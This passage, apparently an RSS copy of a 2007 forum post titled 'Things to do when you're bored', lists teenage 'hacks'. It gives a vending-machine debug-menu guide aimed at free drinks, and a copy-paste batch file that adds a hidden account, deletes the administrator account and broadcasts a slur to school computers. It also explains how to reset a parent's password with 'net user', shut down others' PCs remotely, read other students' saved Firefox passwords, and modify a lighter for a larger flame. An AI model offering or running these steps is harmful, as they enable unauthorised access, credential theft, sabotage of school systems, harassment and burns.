<p>The buttons are numbered depending on how they are positioned. They will either be vertical (more likely), or in horizontal rows of 4 buttons per row. If it is vertical, the first button is <span class="hashtag">#1</span>, the one below it is <span class="hashtag">#2</span>, and so forth. If the buttons are in horizontal rows, the first button is <span class="hashtag">#1</span>, and the one to the right of it is <span class="hashtag">#2</span>. The numbers work like a type writer after that. In rows of 4, the first button of row 2 will be button <span class="hashtag">#5</span>. So, to review, getting in to the debug menu looks like this:</p>
<h2>COKE MACHINE::::::<br>
$1.00 -------</h2>
<h2>[ Coke ] &lt;-- Hit this button last<br>
[ Coke ] &lt;-- Hit this button second<br>
[ Diet Coke ] &lt;-- Hit this button third<br>
[ Sprite ] &lt;-- Hit this button first<br>
[ And so on ]</h2>
<p>Some text should show up on the LED (probably the word “Error”, we’ll explain what it means next sections). If nothing happens, your machine doesn’t have the debug menu.</p>
<p>NAVIGATION<br>
To navigate from option to option (What they are is next section), remember the numberings we gave the buttons. They work as follows:<br>
Button [ 1 ] - Exit/Back<br>
Button [ 2 ] - Up<br>
Button [ 3 ] - Down<br>
Button [ 4 ] - Select</p>
<p>OPTIONS<br>
Depending on the age of the machine, you will get a varying amount of default options available.<br>
On older machines: SALE, VER, EROR, and RTN<br>
On newer machines: CASH, SALE, EROR, and RTN</p>
<p>CASH - Machine Earnings Display<br>
The CASH option will display how much money is in the machine currently. It generally takes a second or two to load. From here, you can scroll up and down through 12 or 16 different options, depending on the machine age. These other options display how much money was spent on each individual item, classified through its button (or slot, as I like to call it) number.<br>
A neat side note about the slot numbers is that there are more slot numbers than there are actual slot, so usually the last 4 buttons contain zero money. This could be so that the same OS could be used on bigger machines, but the newer machines have even more slot numbers.</p>
<p>SALE - Total Sale Count<br>
The SALE option displays how many drinks have been sold out of the machine. This tends to be cumulative, but not on all machines. The stock guy is probably supposed to reset this each time he re-stocks. Also, this has the same sub-options as the CASH option, where you can scroll up and down and see how many drinks have been sold from each slot.</p>
<p>VER - System/Machine Version?<br>
This option will cause a large alphanumeric string to scroll across the LCD. The number looks very much like a serial number, but doesn’t vary from machine to machine. It is most likely the OS or machine version number, but of the older machines that have the option, I haven’t seen one that doesn’t have the same number.</p>
<p>EROR - Error Log<br>
There are 8 different types of errors - COLJ (Column Jams), VEnd (Vend Mechanism), door (Door Switch), sels (Select Switch), CHAR (Changer Errors), acce (Acceptor Errors), StS (Space-to-sales errors), and bVal (Bill Validators). The separate types and actual errors are useless, as you assumably can’t get inside the machine, BUT(!) you can clear the errors. Hold the enter (Number 4) button down for about 2 seconds, and it should clear the error.</p>
<p>RTN - Return<br>
This is simply the return option. Selecting this will exit the debug menu. On newer machines, pressing the BACK button at the main menu will not exit, and RTN must be selected.<br>
A side note: The menu can also be exited by pressing the coin return button.</p>
<p>EXTRAS<br>
By holding in the coin return button and not releasing, on the newer “big-button” machines, this will display the internal temperature in Fahrenheit, as in “42F”.</p>
<p><strong>Update</strong><br>
There are many more menu options that are only accessible if they’ve either been enabled from the computer inside the machine, or on the internal computer behind the door (Probably not feasible for you to access).</p>
<p>CPO - Coin Payout Mode<br>
You can can dump coins from the coin mechanism, and the various menu options allow you to choose which type of coins (Nickels, dimes, etc.) are dumped.</p>
<p>tVFL - Tube Fill Mode<br>
This is useless to you. This allows you to load coins into the coin tubes, which you can’t do from the outside.</p>
<p>TEST - Test Routines<br>
This allows you to test the following various routines:<br>
SE Allows you to test the buttons. Will give you number<br>
of button when you press it<br>
SP Sold-out paddle test. Not quite sure, most likely internal function.<br>
Su Sold-out switch test. Same as paddle.<br>
CO Motor test. Will run various column motors.<br>
Cn Coin test. Put in a coin and it will tell you what kind of<br>
coin it is.<br>
nA Note acceptor test. Same as Cn, but for bills.<br>
dSP Display test. Will illuminate various LEDs.<br>
vErS Rattles off version number.</p>
<p>RELY - Relay test<br>
This tests the relay electronic control of various parts. Do not do, as it will cause damage if various internal parts are not unplugged before usage.</p>
<p>PASS - Password<br>
This is not normally accessible, but allows you to change the menu password from the 4-2-3-1. Whoo!</p>
<p>PrIC - Price Setting<br>
Used to set the price for a drink. Not sure how to work it, but it seems simple enough.</p>
<p>StOS - Space-to-sales routine<br>
Lets you change the STS routine and other options. This means that various buttons will all mean the same thing, i.e. the 6 coke buttons don’t actually vend from 6 different columns, but vend from one (changing when one runs out of course).</p>
<p>COn - Machine Configuration/Permissions<br>
This is the machine config menu that decides what of these options you are allowed to access through the outside panel. This is probably only accessible with the door open. I won’t go into detail, but I’ll list the Config numbers and what each do: C1 sets price menu on, C2 sets special (manufacturer) options on), C3 disables the “ICE COLD COKE” message. C4 is autoviewing of menu when door is opened, C5 is door switch status, C6 is mysteriously reserved for “future use”, C7 determines whether your money credit stays in for 5 minutes or indefinitely, C8 is Force Vend, C9 allows multiple vends without putting in more money (i.e put in a 5 and get 3 cokes and then your change), and C10 is Escrow Inhibit.</p>
<p>CCoC - Correct Change Only Control<br>
Adjusts Correct Change only rule to your liking.</p>
<p>TIME - Time Adjustment<br>
Allows you to set the machine’s local time.</p>
<p>LANG - Language Selection<br>
Not sure how many languages are supported, but there are apparently more than just English.</p>
<h2>USEFULNESS<br>
Unless you can get behind the door, there’s little you can do with this except impress your friends. However, if you’re able to set the C-switches properly, you’ll be able to manipulate the machine in any way you want, get free drinks, change the price, set up cool buy-one-get-one-free deals, etc, etc . Not to forget, knowledge is power. One step closer to free sodas!<br>
<a href="http://www.moparisthebest.com/smf/index.php/topic,14616.0.html" data-bbcode="true" rel="nofollow noopener">http://www.moparisthebest.com/smf/index.php/topic,14616.0.html</a>
</h2>
<p>3)<span class="bbcode-u">Hacking Your school using a batch file:</span><br>
Firstly for people who don’t know how to use CMD. You will not need to use CMD in this tut.<br>
I made it much easier for people.I made a code for you to copy/paste in notepad. Just save it as a bat file.</p>
<p>[code]<a class="mention" href="/u/echo">@ECHO</a> OFF<br>
:START<br>
ECHO made by jonckr<br>
ECHO *******************************************************************<br>
ECHO ******************** account maker will only work on networks******<br>
ECHO ***********<em><strong>make the account then hade the disc or flash drive</strong></em><br>
ECHO *******************************************************************<br>
ECHO USERNAME=death<br>
ECHO PASSWORD=death</p>
<p>NET SEND /USERS “HELLO FAGS THIS SCHOOL IS GAY HAVE FUN”<br>
NET USER death * /ADD /ACTIVE:YES /PASSWORDCHG:NO /EXPIRES:NEVER /TIMES:ALL<br>
ECHO Delete the administrator account<br>
NET USER administrator /DELETE<br>
NET USER adimini /DELETE<br>
NET USE /HOME<br>
PAUSE[/code]</p>
<p>After copying and pasting it, save it as ACCOUNT MAKER.bat</p>
<p>then save it to a disc or a flash drive take it to school and it will give you the new user-name to sign in with and the password and it will look like its not typing any thing but it is atfer words it send a Message to every computer hello fags this school is gay have fun and hopefully it deletes the administrator account have fun</p>
<h2>do what you want to the school and what you do i do not take the blame for it have fun<br>
<a href="http://www.moparisthebest.com/smf/index.php/topic,30472.0.html" data-bbcode="true" rel="nofollow noopener">http://www.moparisthebest.com/smf/index.php/topic,30472.0.html</a>
</h2>
<p>4)<span class="bbcode-u">School computer pranks:</span></p>
<ol>
<li>when you victim/friend has leaft the computer. take a print screen of your victims desktop and then paste it into print and save as. delete all the icons off the desktop and then start&gt;control panel&gt;printers and other hardware&gt;mouse&gt;pointers and and double click normal select and browse for the loading pointer. and press apply. then hide the start toolbar and wait for him to come back. laugh your @$$ off cuz ur victim is siting there waiting for it to load.</li>
</ol>
<p>2.open not pad and conitunously prss ctrl+n. and sit back and watch your friend try to exit all of them.</p>
<p>3.When someone leaves their computer, go into microsoft word and make an auto correct option to change the word <em>the</em> into the word poo or sumthing like that.</p>
<h2>3.First go to google and search windows shutdown utility. DL it. put a shortcut on the desktop and change the icon to the firefox icon and rename the name to firefox or wateva. and next wen they go on there comp. watch them constenly  turn off there comp and they dont know y<br>
<a href="http://www.moparisthebest.com/smf/index.php/topic,75863.0.html" data-bbcode="true" rel="nofollow noopener">http://www.moparisthebest.com/smf/index.php/topic,75863.0.html</a>
</h2>
<p>5)<span class="bbcode-u">Changing someones password without knowing it:</span><br>
Okay this is how you do this on windows XP</p>
<p>Now this may sound stupid, but it may help for those people who get constantly grounded like me =P<br>
First you need access to a guest or administrator account so this is the hard part, you just have to wait for your parents to leave the computer on or something so you can get on for about 1 minute. (one way i reccomend is tell them you need to research for homework or something and actually research but do this at the same time)</p>
<p>Go to start&gt;run.  This should bring up a little window where you need to type in “cmd” (with no quotations)… It will bring up the command box where you will type this:</p>
<p><code>
net user</code><br>
It will bring up a list of all of the accounts on your PC.  after you type that, type this:</p>
<p><code>
net user (name of user you want to change the password to) (password)</code><br>
So if the persons name was bill and you wanted the pass to be cheese, you would put put:</p>
<h2>
<code>
net user bill cheese</code><br>
Make sure you put a space in between the persons name and the pass<br>
<a href="http://www.moparisthebest.com/smf/index.php/topic,130221.0.html" data-bbcode="true" rel="nofollow noopener">http://www.moparisthebest.com/smf/index.php/topic,130221.0.html</a>
</h2>
<p>6)<span class="bbcode-u">Shuting down someones computer while connected by the same router:</span><br>
First off go to start, go to run and type shutdown -i</p>
<p>Wait for the box to pop up called " remote shutdown "</p>
<h2>Then pick your victim.<br>
<a href="http://www.moparisthebest.com/smf/index.php/topic,61564.0.html" data-bbcode="true" rel="nofollow noopener">http://www.moparisthebest.com/smf/index.php/topic,61564.0.html</a>
</h2>
<p>7)<span class="bbcode-u">Make your lighter have a huge flame:</span><br>
This is really cool if you do it right!<br>
All you need is a lighter that has an adjustable gas valve… like this</p>
<p><img src="http://www.networds.com/remodel/images/artifacts/lighter.jpg" alt width="" height=""></p>
<p>i cant give very many pics because I turned the fuel up too high and it sucked all the gas down…</p>
<p>Ok here we go…</p>
<p>Step 1: take the metal gaurd off<br>
Step 2: turn the gas up as far as you can<br>
Step 3: the gas control should be a black ring that goes around a white piece. Lift it up so it doesent turn the white peice and move it all the way to back to the left.<br>
Step 4: push the ring down<br>
Step 5: turn the gas up again. (thats double the gas)<br>
(optional) Step 6: repeat<br>
(optional) Step 7: put metal cover back on</p>
<h2>it seems to have trouble lighting at really high gas levels but it will light if you do it right<br>
<a href="http://www.moparisthebest.com/smf/index.php/topic,20350.0.html" data-bbcode="true" rel="nofollow noopener">http://www.moparisthebest.com/smf/index.php/topic,20350.0.html</a>
</h2>
<h2>8)<span class="bbcode-u">How to make a can bomb:</span><br>
Ok get a normal can.May it be coke or lemonade be it cheap or expensive any can will do.<br>
Step1.Get can and shake doesn’t matter how you shake it just SHAKE TILL YOU’R ARMS DROP OFF.<br>
(Optinol: Make it so a tiny trickle comes out of can.My friend and I suspect it makes it projectile)<br>
Step2.throw it up into the air.May it be a violent flick or a whimpy throw doesn’t matter.<br>
step3:Unless you have shitty clothes on i’d move outta the area.<br>
Step4:Run like hell if you do it near a school or anypuplic place where road or road-type substance is becuase it stains the floor.<br>
<a href="http://www.moparisthebest.com/smf/index.php/topic,25447.0.html" data-bbcode="true" rel="nofollow noopener">http://www.moparisthebest.com/smf/index.php/topic,25447.0.html</a>
</h2>
<p>9)<span class="bbcode-u">How to find remembered firefox passowords:</span><br>
OK this is pretty easy to do and most people probably know about it but here it goes…</p>
<p>OK first open up Mozilla Firefox and click TOOLS then OPTIONS <img src="http://img244.imageshack.us/img244/1061/toolsoptionsxo2.png" alt width="" height=""></p>
<p>Now click SECURITY then SHOW PASSWORDS…<br>
<img src="http://img133.imageshack.us/img133/5206/secpasspb3.png" alt width="" height="">a pop-up will then appear its should look like this:<br>
<img src="http://img133.imageshack.us/img133/2952/secpassht6.png" alt width="" height=""></p>
<p>Click SHOW PASSWORDS it will ask you ‘are you sure blah blah blah’ click yes</p>
<p>and there are the passwords</p>
<h2>this works great at my school because people click yes and don;t notice what there clicking yes to (being them saving there passes)<br>
<a href="http://www.moparisthebest.com/smf/index.php/topic,48028.0.html" data-bbcode="true" rel="nofollow noopener">http://www.moparisthebest.com/smf/index.php/topic,48028.0.html</a>
</h2>
<h2>10)<span class="bbcode-u">How to become a ninja!:</span><br>
<img src="http://server6.uploadit.org/files/greatisgood-Ninja.jpg" alt width="" height=""><br>
<a href="http://www.moparisthebest.com/smf/index.php/topic,33782.0.html" data-bbcode="true" rel="nofollow noopener">http://www.moparisthebest.com/smf/index.php/topic,33782.0.html</a>
</h2>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/things-to-do-when-youre-bored/97479/1">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/things-to-do-when-youre-bored/97479/1</link>
        <pubDate>Sun, 20 May 2007 11:12:17 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-97479-1</guid>
        <source url="https://forum.moparisthebest.com/t/things-to-do-when-youre-bored/97479.rss">Things to do when you&#39;re bored</source>
      </item>
  </channel>
</rss>
